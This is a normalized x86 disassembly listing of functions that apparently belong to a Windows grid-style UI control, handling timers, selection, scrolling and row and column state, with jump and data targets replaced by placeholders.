test [ ebx + 0x249 ] 0x20
jne r-xdata
pop esi
pop ebx
retn
cmp [ esi ] 0xd
jne r-xdata
cmp [ ebx + 0x28d ] 0x0
je r-xdata
mov eax ebx
call sub_46b730
mov eax ebx
call sub_46b720
jmp r-xdata
mov [ esi ] 0x0
sub_46eed8
push ebp
mov ebp esp
add esp 0xffffff80
push ebx
push esi
push edi
mov [ ebp - 0x5 ] cl
mov ebx edx
mov [ ebp - 0x4 ] eax
mov edi [ ebp + 0xc ]
mov [ ebp - 0x11 ] 0x0
mov eax [ ebp - 0x4 ]
call sub_46fdc4
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
jne r-xdata
test bl bl
jne r-xdata
mov eax [ ebp - 0x4 ]
mov si 0xffb8
call sub_403540
test al al
jne r-xdata
test bl bl
jne r-xdata
test [ ebp - 0x5 ] 0x40
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0xc4 ]
mov eax [ ebp - 0x4 ]
call sub_46b6a0
test al al
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_45a2f0
test eax eax
jne r-xdata
xor eax eax
push ebp
push sub_46f283
push [ fs : eax ]
mov [ fs : eax ] esp
push edi
mov eax [ ebp + 0x8 ]
push eax
mov cl [ ebp - 0x5 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_443b64
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
lea edx [ ebp - 0x78 ]
mov eax [ ebp - 0x4 ]
call sub_46c800
mov eax [ ebp - 0x4 ]
add eax 0x28e
push eax
mov eax [ ebp - 0x4 ]
add eax 0x260
push eax
mov eax [ ebp - 0x4 ]
add eax 0x264
push eax
mov eax [ ebp - 0x4 ]
add eax 0x268
push eax
lea eax [ ebp - 0x78 ]
push eax
mov ecx [ ebp + 0x8 ]
mov edx edi
mov eax [ ebp - 0x4 ]
mov esi [ eax ]
call [ esi + 0xcc ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x28e ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov si 0xffe9
call sub_403540
jmp r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_442788
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
lea eax [ ebp - 0x78 ]
push eax
lea eax [ ebp - 0x10 ]
push eax
mov ecx [ ebp + 0x8 ]
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_46c7a4
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x238 ]
mov esi [ ebp - 0x10 ]
cmp eax esi
jg r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x28e ] 0x3
jne r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x249 ] 0x1
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x23c ]
cmp eax [ ebp - 0xc ]
jg r-xdata
lea edx [ ebp - 0x78 ]
mov eax [ ebp - 0x4 ]
call sub_46d1f4
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov si 0xffc8
call sub_403540
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x249 ] 0x2
je r-xdata
cmp [ ebp - 0x10 ] 0x0
jl r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x249 ] 0x4
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_441f54
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x264 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x264 ] eax
cmp [ ebp - 0xc ] 0x0
jl r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x238 ]
cmp eax [ ebp - 0x10 ]
jle r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x28e ] 0x1
push 0x0
push 0x3c
push 0x1
mov eax [ ebp - 0x4 ]
call sub_448d84
push eax
call SetTimer
test [ ebp - 0x5 ] 0x1
je r-xdata
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x228 ]
mov eax [ ebp - 0x10 ]
cmp edx eax
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x23c ]
cmp eax [ ebp - 0xc ]
jle r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x23c ]
cmp eax [ ebp - 0xc ]
jg r-xdata
push 0x1
push 0x1
mov ecx [ ebp - 0xc ]
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_46de6c
jmp r-xdata
lea edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_46dde4
jmp r-xdata
push 0x1
push 0x1
mov ecx [ ebp - 0xc ]
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_46de6c
mov eax [ ebp - 0x4 ]
call sub_46fea0
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x22c ]
cmp edx [ ebp - 0xc ]
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x238 ]
cmp eax [ ebp - 0x10 ]
jg r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0xc ]
mov [ edx + 0x26c ] eax
mov edx [ ebp - 0x4 ]
mov [ edx + 0x270 ] eax
lea ecx [ ebp - 0x80 ]
mov edx [ ebp + 0x8 ]
mov eax edi
call sub_412edc
lea eax [ ebp - 0x80 ]
push eax
mov eax [ ebp - 0x4 ]
lea ecx [ eax + 0x270 ]
mov eax [ ebp - 0x4 ]
lea edx [ eax + 0x26c ]
mov eax [ ebp - 0x4 ]
mov si 0xffa2
call sub_403540
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_46b730
jmp r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x10 ]
mov [ edx + 0x26c ] eax
mov edx [ ebp - 0x4 ]
mov [ edx + 0x270 ] eax
lea ecx [ ebp - 0x80 ]
mov edx [ ebp + 0x8 ]
mov eax edi
call sub_412edc
lea eax [ ebp - 0x80 ]
push eax
mov eax [ ebp - 0x4 ]
lea ecx [ eax + 0x270 ]
mov eax [ ebp - 0x4 ]
lea edx [ eax + 0x26c ]
mov eax [ ebp - 0x4 ]
mov si 0xffa3
call sub_403540
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x28e ] 0x4
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x88 ]
mov eax [ ebp - 0x4 ]
call sub_46d334
mov [ ebp - 0x11 ] 0x1
push 0x0
push 0x3c
push 0x1
mov eax [ ebp - 0x4 ]
call sub_448d84
push eax
call SetTimer
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov si 0xffeb
call sub_403540
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x28e ] 0x5
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x88 ]
mov eax [ ebp - 0x4 ]
call sub_46d334
mov [ ebp - 0x11 ] 0x1
push 0x0
push 0x3c
push 0x1
mov eax [ ebp - 0x4 ]
call sub_448d84
push eax
call SetTimer
sub_46f2a4
push ebp
mov ebp esp
add esp 0xffffff88
push ebx
push esi
push edi
mov esi ecx
mov [ ebp - 0x1 ] dl
mov ebx eax
mov edi [ ebp + 0x8 ]
lea edx [ ebp - 0x70 ]
mov eax ebx
call sub_46c800
mov al [ ebx + 0x28e ]
dec al
je r-xdata
lea eax [ ebp - 0x70 ]
push eax
lea eax [ ebp - 0xc ]
push eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_46c7a4
mov eax [ ebp - 0xc ]
cmp eax [ ebx + 0x238 ]
jl r-xdata
dec eax
sub al 0x2
jb r-xdata
push edi
mov ecx esi
mov dl [ ebp - 0x1 ]
mov eax ebx
call sub_443e1c
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax [ ebp - 0x8 ]
cmp eax [ ebx + 0x23c ]
jl r-xdata
lea edx [ ebp - 0x70 ]
mov eax ebx
call sub_46d1f4
cmp [ ebx + 0x28e ] 0x2
jne r-xdata
sub al 0x2
jae r-xdata
mov eax [ ebp - 0x60 ]
inc eax
cmp eax [ ebp - 0xc ]
jl r-xdata
mov eax [ ebx + 0x268 ]
add eax esi
mov [ ebx + 0x264 ] eax
mov eax [ ebx + 0x268 ]
add eax edi
mov [ ebx + 0x264 ] eax
jmp r-xdata
mov eax [ ebp - 0x30 ]
inc eax
cmp eax [ ebp - 0x8 ]
jl r-xdata
lea edx [ ebp - 0x70 ]
mov eax ebx
call sub_46d1f4
mov al [ ebx + 0x28e ]
dec al
je r-xdata
mov eax [ ebp - 0xc ]
cmp eax [ ebx + 0x210 ]
jne r-xdata
sub al 0x3
je r-xdata
lea edx [ ebp - 0xc ]
mov eax ebx
call sub_46dde4
jmp r-xdata
mov eax [ ebp - 0x8 ]
cmp eax [ ebx + 0x214 ]
je r-xdata
lea eax [ ebp - 0x70 ]
push eax
lea eax [ ebp - 0x40 ]
push eax
push 0x1
lea ecx [ ebp - 0x78 ]
mov edx edi
mov eax esi
call sub_412edc
lea eax [ ebp - 0x78 ]
push eax
mov ecx [ ebp - 0x8 ]
mov edx edi
mov eax ebx
call sub_46f6fc
jmp r-xdata
dec al
je r-xdata
lea eax [ ebp - 0x70 ]
push eax
lea eax [ ebp - 0x70 ]
push eax
push 0x0
lea ecx [ ebp - 0x78 ]
mov edx edi
mov eax esi
call sub_412edc
lea eax [ ebp - 0x78 ]
push eax
mov ecx [ ebp - 0xc ]
mov edx esi
mov eax ebx
call sub_46f6fc
jmp r-xdata
jmp r-xdata
sub_46f408
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov ebx eax
mov eax [ ebx + 0x4 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebx + 0x1c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov esi [ edx + 0x260 ]
dec esi
sub esi eax
jl r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x264 ]
sub eax [ ebp - 0x4 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
inc esi
mov [ ebp - 0x8 ] eax
mov edx [ ebp - 0x8 ]
mov eax [ ebx + 0x2c ]
call [ ebx + 0x28 ]
add eax [ ebx ]
add [ ebp - 0x4 ] eax
inc [ ebp - 0x8 ]
dec esi
jne r-xdata
sub_46f460
push ebp
mov ebp esp
add esp 0xffffff90
push ebx
push esi
push edi
mov [ ebp - 0x6 ] cl
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
mov edi [ ebp + 0x8 ]
mov ebx [ ebp + 0xc ]
xor edx edx
push ebp
push sub_46f6eb
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x28e ]
dec al
je r-xdata
push edi
mov ecx ebx
mov dl [ ebp - 0x6 ]
mov eax [ ebp - 0x4 ]
mov si 0xffd4
call sub_403540
push 0x1
mov eax [ ebp - 0x4 ]
call sub_448d84
push eax
call KillTimer
mov eax [ ebp - 0x4 ]
call sub_46fea0
mov eax [ ebp - 0x4 ]
mov si 0xffeb
call sub_403540
jmp r-xdata
dec eax
sub al 0x2
jb r-xdata
push ebx
push edi
mov cl [ ebp - 0x6 ]
mov dl [ ebp - 0x5 ]
mov eax [ ebp - 0x4 ]
call sub_443ec4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46f6f2
mov eax [ ebp - 0x4 ]
mov [ eax + 0x28e ] 0x0
retn
lea edx [ ebp - 0x68 ]
mov eax [ ebp - 0x4 ]
call sub_46c800
lea edx [ ebp - 0x68 ]
mov eax [ ebp - 0x4 ]
call sub_46d1f4
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x28e ] 0x3
jne r-xdata
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x28e ] 0x3
jne r-xdata
mov eax [ ebp - 0x4 ]
mov si 0xffc8
call sub_403540
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_46d334
push 0x1
mov eax [ ebp - 0x4 ]
call sub_448d84
push eax
call KillTimer
lea ecx [ ebp - 0x70 ]
mov edx edi
mov eax ebx
call sub_412edc
lea eax [ ebp - 0x70 ]
push eax
mov eax [ ebp - 0x4 ]
lea ecx [ eax + 0x270 ]
mov eax [ ebp - 0x4 ]
lea edx [ eax + 0x26c ]
mov eax [ ebp - 0x4 ]
mov si 0xff9e
call sub_403540
test al al
je r-xdata
dec al
je r-xdata
push ebp
lea eax [ ebp - 0x38 ]
call sub_46f408
pop ecx
cmp eax 0x1
jle r-xdata
push ebp
lea eax [ ebp - 0x68 ]
call sub_46f408
pop ecx
cmp eax 0x1
jle r-xdata
mov eax [ ebp - 0x4 ]
call sub_441f54
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x264 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x264 ] eax
mov eax [ ebp - 0x4 ]
call sub_46fea0
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x26c ]
mov edx [ ebp - 0x4 ]
cmp eax [ edx + 0x270 ]
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_46d334
push 0x1
mov eax [ ebp - 0x4 ]
call sub_448d84
push eax
call KillTimer
lea ecx [ ebp - 0x70 ]
mov edx edi
mov eax ebx
call sub_412edc
lea eax [ ebp - 0x70 ]
push eax
mov eax [ ebp - 0x4 ]
lea ecx [ eax + 0x270 ]
mov eax [ ebp - 0x4 ]
lea edx [ eax + 0x26c ]
mov eax [ ebp - 0x4 ]
mov si 0xff9f
call sub_403540
test al al
je r-xdata
jmp r-xdata
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x260 ]
mov ecx eax
mov eax [ ebp - 0x4 ]
call sub_46fd04
mov eax [ ebp - 0x4 ]
call sub_470654
jmp r-xdata
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x260 ]
mov ecx eax
mov eax [ ebp - 0x4 ]
call sub_46f994
mov eax [ ebp - 0x4 ]
call sub_470654
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x270 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x26c ]
mov eax [ ebp - 0x4 ]
call sub_46ba98
mov eax [ ebp - 0x4 ]
call sub_470654
mov eax [ ebp - 0x4 ]
call sub_46fea0
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x26c ]
mov edx [ ebp - 0x4 ]
cmp eax [ edx + 0x270 ]
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_46fea0
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x270 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x26c ]
mov eax [ ebp - 0x4 ]
call sub_46b9c0
mov eax [ ebp - 0x4 ]
call sub_470654
sub_46f6fc
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov edi [ ebp + 0x10 ]
mov eax ebx
mov si 0xffc8
call sub_403540
test al al
je r-xdata
mov eax [ ebp - 0x8 ]
cmp eax [ ebx + 0x270 ]
je r-xdata
cmp [ ebp + 0xc ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x10
mov eax [ edi + 0x18 ]
cmp eax [ ebx + 0x270 ]
jne r-xdata
mov eax ebx
call sub_441f54
sub eax [ ebp - 0x4 ]
mov [ ebp - 0x4 ] eax
mov eax [ edi + 0x20 ]
dec eax
cmp eax [ ebx + 0x270 ]
jne r-xdata
mov eax [ edi + 0x4 ]
cmp eax [ ebp - 0x4 ]
jg r-xdata
mov eax ebx
call sub_46d334
mov eax [ edi + 0x4 ]
cmp eax [ ebp - 0x4 ]
jle r-xdata
mov eax [ edi + 0x8 ]
cmp eax [ ebp - 0x4 ]
jl r-xdata
mov eax [ edi + 0x14 ]
cmp eax [ ebp - 0x4 ]
jg r-xdata
mov eax [ edi + 0x18 ]
cmp eax [ ebx + 0x270 ]
jge r-xdata
cmp [ ebp - 0x8 ] 0x0
jge r-xdata
mov edx [ edi + 0x10 ]
mov eax [ ebx + 0x270 ]
cmp edx eax
jne r-xdata
mov eax [ edi + 0x1c ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
push 0x0
push 0x0
xor ecx ecx
mov edx [ ebp + 0xc ]
mov eax ebx
call sub_46dbc8
mov eax ebx
mov edx [ eax ]
call [ edx + 0x88 ]
mov edx [ ebp + 0x14 ]
mov eax ebx
call sub_46c800
cmp [ ebx + 0x28e ] 0x5
jne r-xdata
mov eax [ ebx + 0x270 ]
mov [ ebp - 0x8 ] eax
mov eax [ edi + 0x10 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov edx [ edi + 0x20 ]
dec edx
cmp eax edx
jge r-xdata
cmp [ ebx + 0x28e ] 0x4
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
lea ecx [ ebp - 0x8 ]
lea edx [ ebx + 0x26c ]
mov eax ebx
mov si 0xffa1
call sub_403540
test al al
jne r-xdata
push 0x0
push 0x0
mov ecx 0x1
mov edx [ ebp + 0xc ]
mov eax ebx
call sub_46dbc8
mov eax ebx
mov edx [ eax ]
call [ edx + 0x88 ]
mov edx [ ebp + 0x14 ]
mov eax ebx
call sub_46c800
mov eax ebx
call sub_46d334
mov eax [ ebp + 0x8 ]
push eax
lea ecx [ ebp - 0x8 ]
lea edx [ ebx + 0x26c ]
mov eax ebx
mov si 0xffa0
call sub_403540
test al al
je r-xdata
mov eax [ ebp - 0x8 ]
mov [ ebx + 0x270 ] eax
sub_46f938
push ebx
push esi
mov esi edx
mov ebx eax
cmp esi [ ebx + 0x21c ]
je r-xdata
pop esi
pop ebx
retn
cmp esi 0x1
jge r-xdata
cmp esi [ ebx + 0x238 ]
jg r-xdata
mov esi 0x1
mov ecx [ ebx + 0x24c ]
mov edx esi
mov eax ebx
call sub_46d054
test [ ebx + 0x249 ] 0x10
je r-xdata
mov edx esi
dec edx
mov eax ebx
call sub_46facc
mov eax [ ebx + 0x21c ]
dec eax
mov [ ebx + 0x210 ] eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
sub_46f994
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_46fa32
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x220 ] 0x0
jne r-xdata
cmp esi [ ebx + 0x21c ]
jl r-xdata
lea eax [ ebx + 0x220 ]
mov ecx [ ebx + 0x230 ]
mov edx [ ebx + 0x21c ]
call sub_46a750
mov eax [ ebx + 0x220 ]
mov eax [ eax + esi * 4 + 0x4 ]
cmp edi eax
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405ca4
mov eax [ ebp - 0x4 ]
call sub_46a354
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46fa39
lea eax [ ebp - 0x4 ]
call sub_404094
retn
push edi
mov ecx eax
mov edx esi
mov eax ebx
call sub_46e018
mov eax [ ebx + 0x220 ]
mov [ eax + esi * 4 + 0x4 ] edi
mov eax ebx
mov si 0xffa5
call sub_403540
sub_46fa40
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x220 ] 0x0
je r-xdata
mov [ ebx + 0x230 ] esi
mov eax ebx
mov si 0xffa5
call sub_403540
mov eax ebx
call sub_46d79c
pop esi
pop ebx
retn
lea eax [ ebx + 0x220 ]
xor ecx ecx
xor edx edx
call sub_46a750
sub_46fa7c
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x250 ] 0x0
je r-xdata
mov [ ebx + 0x234 ] esi
mov eax ebx
mov si 0xffa4
call sub_403540
mov eax ebx
call sub_46d79c
pop esi
pop ebx
retn
lea eax [ ebx + 0x250 ]
xor ecx ecx
xor edx edx
call sub_46a750
sub_46facc
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_46fb54
push [ fs : eax ]
mov [ fs : eax ] esp
cmp esi [ ebx + 0x238 ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46fb5b
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_4040b8
retn
test esi esi
jge r-xdata
cmp esi [ ebx + 0x21c ]
jl r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405ca4
mov eax [ ebp - 0x4 ]
call sub_46a354
mov [ ebx + 0x238 ] esi
mov eax ebx
call sub_46d718
mov eax ebx
call sub_46d79c
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_405ca4
mov eax [ ebp - 0x8 ]
call sub_46a354
sub_46fb64
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_46fbec
push [ fs : eax ]
mov [ fs : eax ] esp
cmp esi [ ebx + 0x23c ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46fbf3
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_4040b8
retn
test esi esi
jge r-xdata
cmp esi [ ebx + 0x24c ]
jl r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405ca4
mov eax [ ebp - 0x4 ]
call sub_46a354
mov [ ebx + 0x23c ] esi
mov eax ebx
call sub_46d718
mov eax ebx
call sub_46d79c
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_405ca4
mov eax [ ebp - 0x8 ]
call sub_46a354
sub_46fbfc
push ebx
mov ebx eax
test dl dl
jne r-xdata
mov eax ebx
call sub_46b730
mov eax [ ebx + 0x27c ]
test eax eax
je r-xdata
mov eax ebx
call sub_46b720
pop ebx
retn
pop ebx
retn
call sub_46aeb8
sub_46fc38
push ebx
push ecx
mov [ esp ] dx
mov ebx eax
mov ax [ esp ]
cmp ax [ ebx + 0x248 ]
je r-xdata
pop edx
pop ebx
retn
test [ esp + 0x1 ] 0x10
je r-xdata
mov ax [ esp ]
mov [ ebx + 0x248 ] ax
cmp [ ebx + 0x28d ] 0x0
jne r-xdata
and [ esp ] 0xdfff
test [ esp + 0x1 ] 0x10
je r-xdata
test [ esp + 0x1 ] 0x20
je r-xdata
mov eax ebx
call sub_46d79c
push 0x1
push 0x0
mov ecx [ ebx + 0x22c ]
mov edx [ ebx + 0x228 ]
mov eax ebx
call sub_46de6c
mov eax ebx
call sub_46b720
mov eax ebx
call sub_46b730
jmp r-xdata
sub_46fcc8
push ebx
push esi
mov esi edx
mov ebx eax
cmp esi [ ebx + 0x24c ]
je r-xdata
pop esi
pop ebx
retn
cmp esi 0x1
jge r-xdata
cmp esi [ ebx + 0x23c ]
jg r-xdata
mov esi 0x1
mov ecx esi
mov edx [ ebx + 0x21c ]
mov eax ebx
call sub_46d054
mov edx esi
dec edx
mov eax ebx
call sub_46fb64
sub_46fd04
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_46fda2
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x250 ] 0x0
jne r-xdata
cmp esi [ ebx + 0x24c ]
jl r-xdata
lea eax [ ebx + 0x250 ]
mov ecx [ ebx + 0x234 ]
mov edx [ ebx + 0x24c ]
call sub_46a750
mov eax [ ebx + 0x250 ]
mov eax [ eax + esi * 4 + 0x4 ]
cmp edi eax
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405ca4
mov eax [ ebp - 0x4 ]
call sub_46a354
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46fda9
lea eax [ ebp - 0x4 ]
call sub_404094
retn
push edi
mov ecx eax
mov edx esi
mov eax ebx
call sub_46e024
mov eax [ ebx + 0x250 ]
mov [ eax + esi * 4 + 0x4 ] edi
mov eax ebx
mov si 0xffa4
call sub_403540
sub_46fdc4
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x27c ] 0x0
je r-xdata
pop ecx
pop ebp
retn
xor eax eax
push ebp
push sub_46fe23
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_46ff80
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x280 ] 0xffffffff
mov eax [ ebp - 0x4 ]
mov [ eax + 0x284 ] 0xffffffff
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x27c ]
call sub_46af5c
retn
sub_46fe30
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
add ebx 0xfffffffc
mov eax [ ebx ]
mov eax [ eax + 0x228 ]
mov edx [ ebx ]
mov [ edx + 0x280 ] eax
mov eax [ ebx ]
mov eax [ eax + 0x22c ]
mov edx [ ebx ]
mov [ edx + 0x284 ] eax
mov eax [ ebx ]
mov eax [ eax + 0x27c ]
mov edx [ eax ]
call [ edx + 0x100 ]
mov eax [ ebx ]
mov eax [ eax + 0x27c ]
call sub_467584
inc eax
jne r-xdata
mov eax [ ebx ]
mov [ eax + 0x219 ] 0x1
mov eax [ ebx ]
mov [ eax + 0x219 ] 0x0
jmp r-xdata
mov eax [ ebx ]
mov eax [ eax + 0x27c ]
call sub_43ab54
pop ebx
pop ebp
retn
sub_46fea0
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0xd4 ]
test al al
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x27c ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x228 ]
mov edx [ ebp - 0x4 ]
cmp eax [ edx + 0x280 ]
jne r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0xd0 ]
mov ebx eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x27c ] ebx
mov eax ebx
mov edx [ ebp - 0x4 ]
call sub_46a870
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x27c ]
mov edx [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x68 ]
push ebp
call sub_46fe30
pop ecx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_46fdc4
push ebp
call sub_46fe30
pop ecx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x22c ]
mov edx [ ebp - 0x4 ]
cmp eax [ edx + 0x284 ]
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0xd4 ]
test al al
je r-xdata
lea eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x22c ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x228 ]
mov eax [ ebp - 0x4 ]
call sub_46b610
lea edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x27c ]
call sub_46b0d4
sub_46ff80
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov ebx eax
xor eax eax
push ebp
push sub_46ffe6
push [ fs : eax ]
mov [ fs : eax ] esp
mov esi [ ebx + 0x280 ]
cmp esi 0xffffffff
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46ffed
lea eax [ ebp - 0x4 ]
call sub_404094
retn
cmp [ ebx + 0x284 ] 0xffffffff
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ ebx + 0x27c ]
call sub_467130
mov eax [ ebp - 0x4 ]
push eax
mov ecx [ ebx + 0x284 ]
mov edx esi
mov eax ebx
mov si 0xffae
call sub_403540
sub_46fff4
test [ eax + 0x249 ] 0x4
je r-xdata
call sub_447dec
retn
mov cl [ edx + 0x4 ]
sub cl 0x8
je r-xdata
mov dl [ edx + 0x4 ]
call sub_46b740
retn
add cl 0xe8
sub cl 0xe0
jae r-xdata
sub_47001c
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov esi [ ebx + 0x27c ]
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_448d84
cmp eax [ edi + 0x8 ]
jne r-xdata
mov ax [ edi + 0x6 ]
sub ax 0x300
jne r-xdata
mov eax ebx
call sub_46ff80
sub_470080
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_4474cc
mov edx esp
mov eax ebx
call sub_46f8b4
mov edx esp
mov eax ebx
call sub_46d7a4
mov edi [ ebx + 0x27c ]
test edi edi
je r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_448d84
cmp eax [ esi + 0x4 ]
je r-xdata
mov eax ebx
call sub_46fdc4
sub_4700f4
push ebx
push esi
add esp 0xfffffff0
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
lea edx [ esp + 0x8 ]
mov eax [ esi + 0x8 ]
call sub_406c90
lea edx [ esp + 0x8 ]
mov ecx esp
mov eax ebx
call sub_442094
mov eax [ esp ]
mov [ ebx + 0x274 ] eax
mov eax [ esp + 0x4 ]
mov [ ebx + 0x278 ] eax
add esp 0x10
pop esi
pop ebx
retn
sub_470138
push ebx
push esi
push edi
push ebp
add esp 0xffffff90
mov edi edx
